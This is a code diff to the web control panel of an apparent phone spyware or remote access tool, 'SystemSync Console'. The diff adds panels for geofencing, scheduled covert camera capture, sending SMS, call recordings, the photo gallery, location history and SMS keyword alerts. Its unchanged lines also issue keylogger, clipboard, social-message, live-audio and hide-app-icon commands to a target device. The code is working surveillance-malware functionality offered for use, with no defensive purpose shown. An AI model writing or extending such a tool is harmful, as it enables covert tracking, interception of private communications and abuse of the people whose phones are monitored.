@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>SystemSync Console · Remote Monitoring</title>
     
+    <!-- External Libraries -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
@@ -34,6 +35,8 @@
 
         .camera-panel { background: #f5f7fa; border-radius: 8px; padding: 12px; margin: 6px 0; display: none; }
         .camera-panel.show { display: block; }
+        .camera-option { margin: 6px 0; font-size: 13px; }
+        .camera-option label { margin-right: 12px; color: #1a2634; }
         .capture-btn, .live-btn { background: #1976ff; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 8px; }
 
         #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: #f5f7fa; }
@@ -74,6 +77,7 @@
         .folder-icon, .file-icon { font-size: 16px; margin-right: 10px; width: 24px; text-align: center; }
         .item-name { font-size: 13px; color: #2c3e50; flex: 1; }
         .file-size { font-size: 11px; color: #94a3b8; margin-left: 8px; }
+        .file-checkbox { width: 14px; height: 14px; margin-right: 10px; cursor: pointer; }
 
         .modal-overlay {
             position: fixed; inset: 0; background: rgba(0,0,0,0.9);
@@ -431,7 +435,7 @@ async function startLiveAudio(){
 }
 function stopLiveAudio(){ if(audioPC)audioPC.close(); audioPC=null; sendSignaling({type:'STOP_AUDIO'}); document.getElementById('liveAudioBtn').style.display='block'; document.getElementById('stopLiveAudioBtn').style.display='none'; panel.innerHTML='Ready.'; }
 
-// FILE MANAGER
+// FILE MANAGER - with sorting and no path box
 function renderFiles() {
     const folders = currentData.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
     const files = currentData.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
@@ -498,9 +502,9 @@ function displayClipboard(data){
     panel.innerHTML=`<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
 }
 function displayCallRecordings(data){
-    const container=document.getElementById('callRecList')||(()=>{const d=document.createElement('div');d.id='callRecList';panel.appendChild(d);return d;})();
-    container.innerHTML='';
-    if(!Array.isArray(data)||!data.length){ container.innerHTML='<p>No recordings yet.</p>'; return; }
+    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No recordings yet.</p>'; return; }
+    panel.innerHTML=`<h3>🎙️ Call Recordings (${data.length})</h3><div id="callRecList"></div>`;
+    const container=document.getElementById('callRecList');
     data.forEach(rec=>{ const card=document.createElement('div'); card.className='call-recording'; card.innerHTML=`<div><strong>${rec.direction==='INCOMING'?'📞':'📤'} ${escapeHtml(rec.name||rec.number||'Unknown')}</strong><div>${rec.number||''} • ${rec.duration||''} • ${rec.timeFmt||''}</div></div><button data-id="${rec.id}" data-path="${rec.filePath}">▶ Play</button>`; card.querySelector('button').onclick=()=>sendCommand('GET_CALL_AUDIO',{id:rec.id,filePath:rec.filePath}); container.appendChild(card); });
 }
 function playCallRecording(audioData){
@@ -513,16 +517,16 @@ function playCallRecording(audioData){
     modal.querySelector('audio').play().catch(()=>{});
 }
 function displayPhotoGallery(data){
-    const grid=document.getElementById('photoGrid')||(()=>{const d=document.createElement('div');d.id='photoGrid';panel.appendChild(d);return d;})();
-    grid.innerHTML='';
-    if(!Array.isArray(data)||!data.length){ grid.innerHTML='<p>No images found.</p>'; return; }
+    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No images found.</p>'; return; }
+    panel.innerHTML=`<h3>🖼️ Photo Gallery (${data.length})</h3><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>`;
+    const grid=document.getElementById('photoGrid');
     data.forEach(img=>{ const tile=document.createElement('div'); tile.className='photo-tile'; if(img.thumb) tile.innerHTML=`<img src="data:image/jpeg;base64,${img.thumb}"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px;">${img.dateFmt||''}</div>`; else tile.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>'; tile.onclick=()=>sendCommand('GET_IMAGE',{mediaId:img.id||img.mediaId}); grid.appendChild(tile); });
 }
 function displayAppEvents(data){
-    const container=document.getElementById('appEventsList')||(()=>{const d=document.createElement('div');d.id='appEventsList';panel.appendChild(d);return d;})();
-    container.innerHTML='';
-    if(!Array.isArray(data)||!data.length){ container.innerHTML='<p>No events yet.</p>'; return; }
+    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No events yet.</p>'; return; }
     const icons={INSTALLED:'📱',REMOVED:'🗑️',CALL_INCOMING:'📞',CALL_OUTGOING:'📤',CALL_MISSED:'📵'};
+    panel.innerHTML=`<h3>📦 App Events (${data.length})</h3><div id="appEventsList"></div>`;
+    const container=document.getElementById('appEventsList');
     data.forEach(ev=>{ const row=document.createElement('div'); row.style.cssText='display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0'; row.innerHTML=`<span style="font-size:22px;">${icons[ev.type]||'📋'}</span><div><div style="font-weight:600;">${escapeHtml(ev.name||ev.pkg||ev.extra||ev.type)}</div><div style="font-size:11px;color:#999;">${ev.type}${ev.pkg?'  •  '+ev.pkg:''}  •  ${ev.timeFmt||ev.date||''}</div></div>`; container.appendChild(row); });
 }
 function displaySocialMessages(data){
@@ -541,14 +545,15 @@ function renderMap(loc){
     L.circle([lat,lon],{radius:acc,color:'#1976ff'}).addTo(mapInstance);
 }
 function displayLocationHistory(data){
-    const listDiv=document.getElementById('historyList')||(document.createElement('div'),listDiv.id='historyList',panel.appendChild(listDiv));
-    listDiv.innerHTML='';
-    if(!Array.isArray(data)||!data.length){ listDiv.innerHTML='<p>No history yet.</p>'; return; }
+    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No history yet.</p>'; return; }
+    panel.innerHTML=`<h3>📍 Location History (${data.length})</h3><div id="historyMap" style="height:320px;"></div><div id="historyList"></div>`;
+    const mapDiv=document.getElementById('historyMap');
     if(window._historyMap)window._historyMap.remove();
-    window._historyMap=L.map('historyMap').setView([data[0].lat,data[0].lon],13);
+    window._historyMap=L.map(mapDiv).setView([data[0].lat,data[0].lon],13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap);
     const coords=data.map(p=>[p.lat,p.lon]); if(coords.length>1) L.polyline(coords,{color:'#1976ff',weight:3}).addTo(window._historyMap);
     data.forEach((p,i)=>L.circleMarker([p.lat,p.lon],{radius:i===0?8:5,color:i===0?'#d32f2f':'#1976ff',fillOpacity:0.8}).addTo(window._historyMap).bindPopup(`<b>${p.timeFmt||''}</b><br>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}`));
+    const listDiv=document.getElementById('historyList');
     listDiv.innerHTML=`<div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>${data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('')}</tbody></table></div>`;
 }
 function capturePicture(){ const camera=document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT',{camera,flash:document.getElementById('clickFlashCheckbox').checked}); }
@@ -556,10 +561,69 @@ function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;b
 function toggleLiveGps(){ liveGpsActive=!liveGpsActive; sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES'); const btn=document.getElementById('liveGpsBtn'); if(btn){ btn.style.background=liveGpsActive?'#d32f2f':''; btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track'; } }
 function toggleAppIcon(){ sendCommand(iconHidden?'SHOW_APP':'HIDE_APP'); }
 function toggleFlash(){ sendCommand(flashOn?'FLASH_OFF':'FLASH_ON'); }
+function showGeofencePanel(){
+    panel.innerHTML='<h3>🗺️ Geofence — Safety Zone</h3><p>Click the map to set the safe zone centre.</p><div id="geofenceMap" style="height:300px;margin-bottom:12px;"></div><div style="display:flex;gap:8px;"><input id="gfLat" placeholder="Latitude"><input id="gfLon" placeholder="Longitude"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div style="margin-top:8px;"><button id="setFenceBtn">Set Fence</button><button id="clearFenceBtn">Clear</button><button id="getFenceStatusBtn">Status</button></div>';
+    setTimeout(()=>{ const map=L.map('geofenceMap').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); let marker,circle; map.on('click',e=>{ document.getElementById('gfLat').value=e.latlng.lat.toFixed(6); document.getElementById('gfLon').value=e.latlng.lng.toFixed(6); if(marker)map.removeLayer(marker); if(circle)map.removeLayer(circle); marker=L.marker([e.latlng.lat,e.latlng.lng]).addTo(map); const r=parseFloat(document.getElementById('gfRadius').value)||500; circle=L.circle([e.latlng.lat,e.latlng.lng],{radius:r,color:'#1976ff',fillOpacity:0.15}).addTo(map); }); document.getElementById('setFenceBtn').onclick=()=>{ const lat=parseFloat(document.getElementById('gfLat').value); const lon=parseFloat(document.getElementById('gfLon').value); const rad=parseFloat(document.getElementById('gfRadius').value)||500; if(isNaN(lat)||isNaN(lon))return showNotification('Enter valid coordinates'); sendCommand('SET_GEOFENCE',{lat,lon,radius:rad}); }; document.getElementById('clearFenceBtn').onclick=()=>sendCommand('CLEAR_GEOFENCE'); document.getElementById('getFenceStatusBtn').onclick=()=>sendCommand('GET_GEOFENCE'); },100);
+}
+function showSchedulePanel(){
+    panel.innerHTML='<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label>Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched">Start</button><button id="stopSched">Stop</button></div>';
+    document.getElementById('startSched').onclick=()=>{ const mins=parseInt(document.getElementById('schedInterval').value)||5; const cam=parseInt(document.getElementById('schedCam').value); sendCommand('SET_SCHEDULED_CAPTURE',{intervalMinutes:mins,cameraId:cam}); };
+    document.getElementById('stopSched').onclick=()=>sendCommand('STOP_SCHEDULED_CAPTURE');
+}
+function showSendSmsPanel(){
+    panel.innerHTML='<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number"><textarea id="smsBody" rows="4" placeholder="Message"></textarea><button id="sendSmsBtn">Send</button></div>';
+    document.getElementById('sendSmsBtn').onclick=()=>{ const num=document.getElementById('smsNumber').value.trim(); const body=document.getElementById('smsBody').value.trim(); if(!num||!body)return showNotification('Enter number and message'); sendCommand('SEND_SMS',{number:num,body}); };
+}
+function showLocationHistoryPanel(){
+    panel.innerHTML='<h3>📍 Location History</h3><p>GPS fixes logged automatically.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="historyMap" style="height:320px;"></div><div id="historyList"></div>';
+    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_LOCATION_HISTORY',{days:parseInt(btn.dataset.days)}));
+    setTimeout(()=>{ window._historyMap=L.map('historyMap').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); },100);
+    sendCommand('GET_LOCATION_HISTORY',{days:3});
+}
+function showCallRecordingsPanel(){
+    panel.innerHTML='<h3>🎙️ Call Recordings</h3><p>⚠️ On some devices, only microphone audio may be captured.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="callRecList"></div>';
+    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_CALL_RECORDINGS',{days:parseInt(btn.dataset.days)}));
+    sendCommand('GET_CALL_RECORDINGS',{days:5});
+}
+function showPhotoGalleryPanel(){
+    panel.innerHTML='<h3>🖼️ Photo Gallery</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>';
+    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_RECENT_IMAGES',{days:parseInt(btn.dataset.days)}));
+    sendCommand('GET_RECENT_IMAGES',{days:5});
+}
+function showAppEventsPanel(){
+    panel.innerHTML='<h3>📦 App & Call Events</h3><p>App installs/removals and call events.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>';
+    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_EVENTS',{days:parseInt(btn.dataset.days)}));
+    sendCommand('GET_APP_EVENTS',{days:5});
+}
+function showSmsKeywordsPanel(){
+    panel.innerHTML='<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully"><button id="saveKw">Save</button></div><div><button id="viewKw">View Current</button><button id="clearKw">Clear All</button><button id="viewAlerts">View Alerts</button></div><div id="kwResult"></div>';
+    document.getElementById('saveKw').onclick=()=>{ const raw=document.getElementById('kwInput').value.trim(); if(!raw)return showNotification('Enter at least one keyword'); const kws=raw.split(',').map(k=>k.trim()).filter(k=>k); sendCommand('SET_SMS_KEYWORDS',{keywords:kws}); };
+    document.getElementById('viewKw').onclick=()=>sendCommand('GET_SMS_KEYWORDS');
+    document.getElementById('clearKw').onclick=()=>sendCommand('CLEAR_SMS_KEYWORDS');
+    document.getElementById('viewAlerts').onclick=()=>sendCommand('GET_SMS_ALERTS',{days:5});
+}
+function displaySmsKeywords(data){
+    const div=document.getElementById('kwResult');
+    if(!div)return;
+    div.innerHTML='';
+    if(!Array.isArray(data)||!data.length){ div.innerHTML='<p>No keywords set.</p>'; return; }
+    div.innerHTML=`<h4>Active Keywords (${data.length})</h4><div style="display:flex;flex-wrap:wrap;gap:8px;">${data.map(kw=>`<span style="background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;border-radius:16px;padding:4px 12px;">${escapeHtml(kw)}</span>`).join('')}</div>`;
+}
+function displaySmsAlerts(data){
+    const div=document.getElementById('kwResult');
+    if(!div)return;
+    div.innerHTML=`<h4>⚠️ Alert History (${Array.isArray(data)?data.length:0})</h4>`;
+    if(!Array.isArray(data)||!data.length){ div.innerHTML+='<p>No alerts triggered yet.</p>'; return; }
+    data.forEach(alert=>{ div.innerHTML+=`<div style="background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px;"><div style="display:flex;justify-content:space-between;"><span style="background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;">${escapeHtml(alert.keyword)}</span><span style="font-size:11px;">${alert.timeFmt||''}</span></div><div>From: ${escapeHtml(alert.from||'')}</div><div>${escapeHtml(alert.body||alert.message||'')}</div></div>`; });
+}
+function showAppUsagePanel(){
+    panel.innerHTML='<h3>📊 Screen Time</h3><div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap"><button data-days="1" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">Today</button><button data-days="7" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">7 Days</button><button data-days="30" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">30 Days</button></div><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission in device Settings</p>';
+    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_USAGE',{days:parseInt(btn.dataset.days)}));
+    sendCommand('GET_APP_USAGE',{days:1});
+}
 
 // MESSAGE HANDLER
 function handleJSON(json){
-    console.log('handleJSON:',json.type);
     if(Array.isArray(json)){
         if(pendingCommand==='LIST_FILES'){ currentData=json; renderFiles(); }
         else if(pendingCommand==='GET_SMS'){ displaySMS(json); }
@@ -573,7 +637,6 @@ function handleJSON(json){
         case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
         case 'LOCATION_UPDATE': renderMap(json.data||json); break;
-        case 'AUDIO_RECORDING': panel.innerHTML=`<audio controls src="data:audio/3gp;base64,${json.data}"></audio><button onclick="downloadBase64('${json.data}','recording.3gp')">💾 Download</button>`; break;
         case 'FILE_INFO': fileTransfers[json.transferId]={chunks:new Array(json.totalChunks),totalChunks:json.totalChunks,fileName:json.fileName,received:0}; document.getElementById('progressFileName').innerText=json.fileName; document.getElementById('progressPercent').innerText='0%'; document.getElementById('progressBar').style.width='0%'; document.getElementById('downloadProgress').style.display='block'; break;
         case 'FILE_CHUNK': const tr=fileTransfers[json.transferId]; if(!tr)return; setTimeout(()=>{ try{ const bin=atob(json.data), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks), url=URL.createObjectURL(blob), a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } }catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
         case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); break;
@@ -592,15 +655,22 @@ function handleJSON(json){
         case 'RECENT_IMAGES_DATA': try{ displayPhotoGallery(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'LOCATION_HISTORY_DATA': try{ displayLocationHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'APP_EVENTS_DATA': try{ displayAppEvents(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
+        case 'SMS_KEYWORDS_DATA': try{ displaySmsKeywords(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
+        case 'SMS_ALERTS_DATA': try{ displaySmsAlerts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
+        case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
+        case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
+        case 'GEOFENCE_INFO': try{ const gi=json.data; if(gi&&gi.active) panel.innerHTML=`<h3>🗺️ Geofence Active</h3><p>📍 ${parseFloat(gi.lat).toFixed(5)}, ${parseFloat(gi.lon).toFixed(5)}</p><p>📏 Radius: ${gi.radius}m</p>`; else panel.innerHTML='<h3>🗺️ Geofence</h3><p>No active geofence.</p>'; }catch(e){} break;
+        case 'GEOFENCE_ALERT': pushAlert('Geofence',json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone'); break;
+        case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
+        case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
         case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
         case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
         case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); break;
         case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
         case 'GPS_UPDATES_STOPPED': liveGpsActive=false; const gpsBtn=document.getElementById('liveGpsBtn'); if(gpsBtn){ gpsBtn.querySelector('span:last-child').textContent='Live GPS Track'; gpsBtn.style.cssText=''; } showNotification('GPS tracking stopped'); break;
-        case 'GEOFENCE_ALERT': pushAlert('Geofence',json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone'); break;
-        case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: '+json.keyword,'From '+json.from+': '+json.body); break;
         case 'NOTIFICATION_LIVE': pushAlert('📳 '+(json.app||'App'),(json.title||'')+': '+(json.text||'')); break;
         case 'CALL_ALERT': if(json.event==='RINGING') pushAlert('📞 Incoming Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); else if(json.event==='MISSED') pushAlert('📵 Missed Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); break;
+        case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: '+json.keyword,'From '+json.from+': '+json.body); break;
         case 'HEARTBEAT': break;
         default: console.log('Unhandled type:',json.type);
     }
@@ -636,21 +706,21 @@ function setupEvents(){
     document.getElementById('installedAppsBtn').onclick=()=>sendCommand('GET_INSTALLED_APPS');
     document.getElementById('browserHistoryBtn').onclick=()=>sendCommand('GET_BROWSER_HISTORY');
     document.getElementById('wifiNetworksBtn').onclick=()=>sendCommand('GET_WIFI_NETWORKS');
-    document.getElementById('screenTimeBtn').onclick=()=>sendCommand('GET_APP_USAGE',{days:1});
+    document.getElementById('screenTimeBtn').onclick=showAppUsagePanel;
     document.getElementById('socialMessagesBtn').onclick=()=>sendCommand('GET_SOCIAL_MESSAGES',{days:3});
     document.getElementById('keylogBtn').onclick=()=>sendCommand('GET_KEYLOG');
     document.getElementById('clipboardBtn').onclick=()=>sendCommand('GET_CLIPBOARD');
-    document.getElementById('geofenceBtn').onclick=()=>{ panel.innerHTML='<h3>🗺️ Geofence</h3><input id="gfLat" placeholder="Latitude"><input id="gfLon" placeholder="Longitude"><input id="gfRad" placeholder="Radius (m)" value="500"><button onclick="sendCommand(\'SET_GEOFENCE\',{lat:parseFloat(document.getElementById(\'gfLat\').value),lon:parseFloat(document.getElementById(\'gfLon\').value),radius:parseFloat(document.getElementById(\'gfRad\').value)})">Set Fence</button><button onclick="sendCommand(\'CLEAR_GEOFENCE\')">Clear</button><button onclick="sendCommand(\'GET_GEOFENCE\')">Status</button>'; };
-    document.getElementById('autoCaptureBtn').onclick=()=>{ const mins=prompt('Interval (minutes)','5'); if(mins) sendCommand('SET_SCHEDULED_CAPTURE',{intervalMinutes:parseInt(mins),cameraId:0}); };
+    document.getElementById('geofenceBtn').onclick=showGeofencePanel;
+    document.getElementById('autoCaptureBtn').onclick=showSchedulePanel;
     document.getElementById('liveGpsBtn').onclick=toggleLiveGps;
-    document.getElementById('locationHistoryBtn').onclick=()=>{ panel.innerHTML='<h3>📍 Location History</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="historyMap" style="height:320px;"></div><div id="historyList"></div>'; panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_LOCATION_HISTORY',{days:parseInt(btn.dataset.days)})); setTimeout(()=>{ window._historyMap=L.map('historyMap').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap); },100); sendCommand('GET_LOCATION_HISTORY',{days:3}); };
-    document.getElementById('callRecordingsBtn').onclick=()=>{ panel.innerHTML='<h3>🎙️ Call Recordings</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="callRecList"></div>'; panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_CALL_RECORDINGS',{days:parseInt(btn.dataset.days)})); sendCommand('GET_CALL_RECORDINGS',{days:5}); };
-    document.getElementById('photoGalleryBtn').onclick=()=>{ panel.innerHTML='<h3>🖼️ Photo Gallery</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>'; panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_RECENT_IMAGES',{days:parseInt(btn.dataset.days)})); sendCommand('GET_RECENT_IMAGES',{days:5}); };
-    document.getElementById('appEventsBtn').onclick=()=>{ panel.innerHTML='<h3>📦 App & Call Events</h3><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>'; panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_EVENTS',{days:parseInt(btn.dataset.days)})); sendCommand('GET_APP_EVENTS',{days:5}); };
-    document.getElementById('smsKeywordsBtn').onclick=()=>{ const kw=prompt('Keywords (comma separated)'); if(kw) sendCommand('SET_SMS_KEYWORDS',{keywords:kw.split(',').map(k=>k.trim())}); else sendCommand('GET_SMS_KEYWORDS'); };
+    document.getElementById('locationHistoryBtn').onclick=showLocationHistoryPanel;
+    document.getElementById('callRecordingsBtn').onclick=showCallRecordingsPanel;
+    document.getElementById('photoGalleryBtn').onclick=showPhotoGalleryPanel;
+    document.getElementById('appEventsBtn').onclick=showAppEventsPanel;
+    document.getElementById('smsKeywordsBtn').onclick=showSmsKeywordsPanel;
     document.getElementById('toggleAppIconBtn').onclick=toggleAppIcon;
     document.getElementById('lockDeviceBtn').onclick=()=>sendCommand('LOCK_DEVICE');
-    document.getElementById('sendSmsBtn').onclick=()=>{ const num=prompt('Recipient number'); const msg=prompt('Message'); if(num&&msg) sendCommand('SEND_SMS',{number:num,body:msg}); };
+    document.getElementById('sendSmsBtn').onclick=showSendSmsPanel;
     document.getElementById('vibrateBtn').onclick=()=>sendCommand('VIBRATE',{duration:1000});
     document.getElementById('toggleFlashBtn').onclick=toggleFlash;
     document.getElementById('flashTimedBtn').onclick=()=>sendCommand('FLASH_TIMED',{duration:5000});
